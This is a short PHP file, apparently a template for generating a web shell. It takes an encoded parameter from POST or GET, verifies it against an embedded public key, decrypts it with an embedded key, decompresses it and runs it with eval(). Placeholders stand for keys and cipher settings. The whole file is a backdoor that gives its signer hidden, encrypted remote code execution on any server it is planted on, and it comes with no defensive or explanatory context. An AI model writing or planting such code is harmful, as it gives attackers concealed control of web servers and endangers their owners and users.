<?php
if (isset($_POST['p'])) $p = $_POST['p']; else $p = $_GET['p'];
$d = base64_decode(str_replace(' ', '+', $p));
$s = substr($d, 0, {{signature_length}});
$d = substr($d, {{signature_length}});
$a = <<<EOF
{{author.pub}}
EOF;
if (1 !== openssl_verify($d, $s, $a, {{signature_digest}})) {
  exit(1);
}

$k = base64_decode('{{web.key}}');
$i = substr($d, 0, {{cipher_iv_length}});
$d = substr($d, {{cipher_iv_length}});
$d = openssl_decrypt($d, '{{cipher}}', $k, OPENSSL_RAW_DATA, $i);
$d = gzinflate($d);
if (substr($d, 0, 1) === '<') {
  $d = '?>' . $d;
}
eval($d);
